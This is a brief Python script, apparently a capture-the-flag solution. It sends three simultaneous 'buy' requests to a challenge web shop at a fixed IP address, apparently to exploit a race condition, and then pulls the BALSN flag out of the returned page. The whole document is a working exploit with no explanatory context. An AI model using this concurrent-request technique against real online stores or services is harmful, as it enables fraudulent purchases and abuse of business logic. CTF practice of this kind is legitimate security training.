import requests
from multiprocessing.dummy import Pool as ThreadPool
r = requests.get('http://140.112.31.97:10161')
new_url = r.url
def func(x):
    return requests.get(new_url+'buy?name='+x)

pokes = ["Slowpoke", "Eevee", "Snorlax"]
with ThreadPool(3) as pool:
    result = pool.map(func, pokes)
r = requests.get(new_url)
import re
flag = re.search("BALSN{(.*?)}", r.text).group(0)
print(flag)